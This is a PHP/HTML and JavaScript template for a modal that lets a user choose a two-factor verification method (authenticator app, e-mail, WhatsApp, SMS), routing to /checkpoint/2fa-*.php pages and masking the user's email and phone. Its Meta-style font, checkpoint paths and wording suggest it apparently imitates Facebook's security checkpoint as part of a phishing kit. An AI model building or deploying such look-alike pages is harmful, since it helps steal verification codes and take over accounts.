<style>
    #choosemd .modal-dialog {
        max-width: 420px;
        margin: auto;
    }

    #choosemd .modal-content {
        font-size: 14px;
        padding: 15px;
    }

    .modal .modal-content {
        border-radius: 25px;
        background: rgb(249, 241, 249);
        background: linear-gradient(90deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%);
    }

    .modal-content {
        position: relative;
        display: flex;
        flex-direction: column;
        width: 100%;
        pointer-events: auto;
        background-color: #fff;
        background-clip: padding-box;
        border: 1px solid rgba(0, 0, 0, .2);
        border-radius: .3rem;
        outline: 0;
    }

    #choosemd .modal-body {
        font-size: 16px;
    }

    .modal-body {
        position: relative;
        flex: 1 1 auto;
        padding: 1rem;
    }

    .twoFA-options {
        list-style: none;
        margin: 0;
        padding: 0;
        border: 1px solid #ccc;
        border-radius: 15px;
        overflow: hidden;
    }

    ul {
        margin: 0;
        font-size: 15px;
        line-height: 20px;
        font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif !important;
    }

    .twoFA-options {
        list-style: none;
        /* Loại bỏ ký hiệu bullet */
        margin: 0;
        /* Xóa khoảng cách bên ngoài */
        padding: 0;
        /* Xóa khoảng cách bên trong */
        border: 1px solid #ccc;
        /* Đặt viền chung cho toàn bộ danh sách */
        border-radius: 15px;
        /* Bo tròn viền chung */
        overflow: hidden;
        /* Đảm bảo các góc không bị thừa */
    }

    .twoFA-option {
        display: flex;
        /* Căn ngang các nội dung */
        align-items: center;
        /* Căn giữa dọc */
        justify-content: space-between;
        /* Tạo khoảng cách đều giữa các phần */
        padding: 10px 15px;
        /* Khoảng cách bên trong */
        border-bottom: 1px solid #ccc;
        /* Đường viền ngăn cách giữa các tùy chọn */
        transition: background-color 0.3s ease;
        /* Hiệu ứng mượt khi hover */
    }

    .twoFA-option:last-child {
        border-bottom: none;
        /* Xóa viền dưới cùng của phần tử cuối */
    }

    .twoFA-option:hover {
        background-color: #f8f9fa00;
        /* Đổi màu nền khi hover */
    }

    .twoFA-option input[type="radio"]:checked+label {
        border-left: 2px solid #007bff;
        /* Đường viền màu xanh bên trái khi được chọn */
        background-color: #e7f3ff00;
        /* Màu nền nhạt khi được chọn */
    }

    .option-title {
        font-weight: bold;
        /* Tô đậm tiêu đề */
    }

    .option-description {
        font-size: 14px;
        /* Kích thước chữ nhỏ hơn cho mô tả */
        color: #666;
        /* Màu chữ xám nhạt */
    }

    .option-title {
        font-size: 15px;
        font-weight: bold;
        color: #333;
    }

    .option-description {
        margin-top: 2px;
        font-size: 14px;
        color: #767676;
    }
</style>

<div class="overlay overlay3" id="overlay3"></div>
<div class="modal" id="choosemd" tabindex="-1" aria-labelledby="chooseModalLabel" role="dialog" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
            <!-- Header -->
            <div class="modal-header">
                <h5 class="modal-title" id="chooseModalLabel">Choose a way to confirm that it's you</h5>
                <button type="button" class="btn-close" id="closechose" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>

            <!-- Body -->
            <div class="modal-body">
                <!-- Danh sách tùy chọn -->
                <ul class="twoFA-options">
                    <!-- Email -->
                    <li class="twoFA-option" data-link="/checkpoint/2fa-app.php">
                        <label for="auth-app">
                            <div class="option-title">Authenticator app</div>
                            <div class="option-description">Go to your authentication app<strong></strong></div>
                        </label>
                        <input type="radio" name="auth-option" id="auth-app" checked="">
                    </li>
                    <li class="twoFA-option" data-link="/checkpoint/2fa-email.php">
                        <label for="auth-email">
                            <div class="option-title">E-mail</div>
                            <div class="option-description">We will send a code to <strong id="masked-email"><?php echo htmlspecialchars($email); ?></strong></div>
                        </label>
                        <input type="radio" name="auth-option" id="auth-email">
                    </li><!-- WhatsApp -->
                    <li class="twoFA-option" data-link="/checkpoint/2fa-whatsapp.php">
                        <label for="auth-whatsapp">
                            <div class="option-title">WhatsApp</div>
                            <div class="option-description">We will send a code to the number <strong id="masked-whatsapp"><?php echo htmlspecialchars($phone); ?></strong></div>
                        </label>
                        <input type="radio" name="auth-option" id="auth-whatsapp">
                    </li>
                    <!-- SMS -->
                    <li class="twoFA-option" data-link="/checkpoint/2fa-sms.php">
                        <label for="auth-sms">
                            <div class="option-title">SMS</div>
                            <div class="option-description">We will send a code to the number <strong id="masked-sms"><?php echo htmlspecialchars($phone); ?></strong></div>
                        </label>
                        <input type="radio" name="auth-option" id="auth-sms">
                    </li>
                </ul>

                <!-- Nút mới -->
                <div class="form-btn-wrapper">
                    <button class="btn btn-primary" id="choosevr-btn" type="button">
                        <div class="spinner-border text-light" id="choosevr-spinner" role="status" style="display: none;">
                            <span class="visually-hidden">Loading...</span>
                        </div>
                        <span class="button-text">Continue</span>
                    </button>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    // Khi người dùng nhấn nút "Try another way"
    document.getElementById('morway').addEventListener('click', function() {
        // Ẩn modal hiện tại (ví dụ là modal có ID "exampleModal2")
        document.getElementById('exampleModal2').style.display = 'none';
        // Hiển thị modal có ID "choosemd"
        document.getElementById('choosemd').style.display = 'block';
        // Hiển thị overlay tối (background tối cho modal)
        document.getElementById('overlay3').style.display = 'block';
        // Ẩn overlay trước đó (nếu có)
        document.getElementById('overlay2').style.display = 'none';
    });

    // Khi người dùng nhấn nút đóng modal "choosemd"
    document.getElementById('closechose').addEventListener('click', function() {
        // Ẩn modal "choosemd"
        document.getElementById('choosemd').style.display = 'none';
        // Ẩn overlay
        document.getElementById('overlay3').style.display = 'none';
        // Hiển thị lại modal ban đầu nếu cần
        document.getElementById('exampleModal2').style.display = 'block';
        // Hiển thị lại overlay ban đầu nếu cần
        document.getElementById('overlay2').style.display = 'block';
    });
</script>

<script>
    document.getElementById('morway').addEventListener('click', function() {
        document.getElementById('choosemd').classList.add('active');
        document.getElementById('overlay').classList.add('active');
    });

    document.getElementById('closechose').addEventListener('click', function() {
        document.getElementById('choosemd').classList.remove('active');
        document.getElementById('overlay').classList.remove('active');
    });
</script>


<!-- link 2fa -->
<script>
    // Select all the li elements
    const options = document.querySelectorAll('.twoFA-option');

    // Add event listeners to each li element to toggle radio button
    options.forEach(option => {
        option.addEventListener('click', function() {
            // Uncheck all radio buttons
            document.querySelectorAll('input[name="auth-option"]').forEach(input => {
                input.checked = false;
            });

            // Check the radio button of the clicked li
            this.querySelector('input[type="radio"]').checked = true;
        });
    });

    // Add event listener for the Continue button
    document.getElementById('choosevr-btn').addEventListener('click', function() {
        // Find the selected option (checked radio button)
        const selectedOption = document.querySelector('input[name="auth-option"]:checked');

        // If there's a selected option, redirect to its link
        if (selectedOption) {
            const parentLi = selectedOption.closest('.twoFA-option');
            const link = parentLi.getAttribute('data-link');
            window.location.href = link; // Redirect to the link
        }
    });
</script>


<!-- MÃ HÓA INFO -->
<script>
    // Hàm để che email
    function maskEmail(email) {
        const [localPart, domain] = email.split('@');
        const maskedLocal = localPart[0] + '*'.repeat(localPart.length - 1);
        return maskedLocal + '@' + domain;
    }

    // Hàm để che số điện thoại theo định dạng +13********12
    function maskPhone(phone) {
        const countryCode = phone.slice(0, 3); // lấy mã quốc gia (+13)
        const lastDigits = phone.slice(-2); // lấy 2 chữ số cuối
        const maskedMiddle = '*'.repeat(phone.length - 5); // các dấu * thay cho các chữ số ở giữa
        return `${countryCode}${maskedMiddle}${lastDigits}`;
    }

    // Lấy giá trị email và số điện thoại từ PHP
    const email = "<?php echo htmlspecialchars($email); ?>"; // Giá trị email từ PHP
    const phone = "<?php echo htmlspecialchars($phone); ?>"; // Giá trị phone từ PHP

    // Thêm email và số điện thoại đã được che vào HTML
    document.getElementById('masked-email').textContent = maskEmail(email);
    document.getElementById('masked-whatsapp').textContent = maskPhone(phone);
    document.getElementById('masked-sms').textContent = maskPhone(phone);
</script>